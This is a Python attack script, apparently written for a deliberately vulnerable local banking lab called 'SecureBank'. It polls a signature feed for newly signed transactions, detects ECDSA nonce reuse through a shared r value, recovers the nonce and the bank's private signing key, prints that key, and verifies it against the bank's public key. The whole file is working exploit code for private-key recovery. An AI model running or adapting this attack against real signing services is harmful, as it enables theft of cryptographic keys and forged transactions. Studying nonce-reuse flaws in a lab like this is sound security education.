
import sys
import time
import hashlib
import requests

from pathlib import Path
from datetime import datetime, timezone

# Make project packages accessible
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization

from crypto.ecdsa_sign import serialize_transaction
from crypto.vulnerable_signer import P256_ORDER


BASE_URL = "http://127.0.0.1:5001"
PUBLIC_KEY_PATH = PROJECT_ROOT / "keys" / "bank_public.pem"

POLL_INTERVAL = 2
TIMEOUT = 180


def collect_new_signatures(since):
    print("[*] Waiting for new signed transactions...")
    print("[*] Make two transfers through the banking interface.")

    deadline = time.monotonic() + TIMEOUT

    while time.monotonic() < deadline:

        response = requests.get(
            f"{BASE_URL}/api/lab/signature-feed",
            params={"since": since},
            timeout=5
        )

        response.raise_for_status()

        records = response.json()["transactions"]

        print(f"\r[*] New signed transactions collected: {len(records)}", end="", flush=True)

        if len(records) >= 2:
            print()
            print(f"[+] Collected {len(records)} new transactions")
            return records

        time.sleep(POLL_INTERVAL)

    print()
    raise TimeoutError("Timed out waiting for two new transactions")


def detect_nonce_reuse(records):
    print("[*] Checking signatures for nonce reuse...")

    groups = {}

    for record in records:
        r = int(record["signature"]["r"], 16)
        groups.setdefault(r, []).append(record)

    for group in groups.values():

        for i in range(len(group)):
            for j in range(i + 1, len(group)):

                first = group[i]
                second = group[j]

                tx1 = first["transaction"]
                tx2 = second["transaction"]

                if serialize_transaction(tx1) == serialize_transaction(tx2):
                    continue

                print("[+] Nonce reuse detected!")
                print(f"[+] Transaction 1: {tx1['transaction_id']}")
                print(f"[+] Transaction 2: {tx2['transaction_id']}")

                return first, second

    raise ValueError(
        "No nonce reuse detected in the new transactions. "
        "Check that vulnerable mode is enabled."
    )


def recover_private_key(record1, record2):

    tx1 = record1["transaction"]
    tx2 = record2["transaction"]

    sig1 = record1["signature"]
    sig2 = record2["signature"]

    r1 = int(sig1["r"], 16)
    r2 = int(sig2["r"], 16)

    s1 = int(sig1["s"], 16)
    s2 = int(sig2["s"], 16)

    if r1 != r2:
        raise ValueError("The signatures do not share the same r")

    z1 = int.from_bytes(
        hashlib.sha256(serialize_transaction(tx1)).digest(),
        "big"
    )

    z2 = int.from_bytes(
        hashlib.sha256(serialize_transaction(tx2)).digest(),
        "big"
    )

    n = P256_ORDER

    k = (
        (z1 - z2) *
        pow((s1 - s2) % n, -1, n)
    ) % n

    d = (
        (s1 * k - z1) *
        pow(r1, -1, n)
    ) % n

    print("[+] Reused nonce recovered")
    print("[+] Private key candidate recovered")
    print(f"[+] Recovered private key: {d:064x}")
    return d


def verify_recovered_key(private_value):

    print("[*] Verifying candidate against bank public key...")

    with open(PUBLIC_KEY_PATH, "rb") as file:
        public_key = serialization.load_pem_public_key(file.read())

    recovered_public_key = ec.derive_private_key(
        private_value,
        ec.SECP256R1()
    ).public_key()

    if recovered_public_key.public_numbers() == public_key.public_numbers():
        print("[SUCCESS] Bank private key successfully recovered!")
        return True

    print("[-] Recovered key does not match bank public key")
    return False


def main():

    # Capture the starting time automatically
    since = datetime.now(timezone.utc).isoformat(timespec="microseconds")

    print("======================================")
    print("       SECUREBANK ECDSA ATTACK")
    print("======================================")

    print(f"[+] Attack session started: {since}")

    records = collect_new_signatures(since)

    record1, record2 = detect_nonce_reuse(records)

    private_value = recover_private_key(record1, record2)

    verify_recovered_key(private_value)


if __name__ == "__main__":

    try:
        main()

    except requests.RequestException as error:
        print(f"\n[-] API connection error: {error}")

    except (ValueError, KeyError, ZeroDivisionError, TimeoutError) as error:
        print(f"\n[-] Attack failed: {error}")

    except FileNotFoundError:
        print("[-] Bank public key file not found")

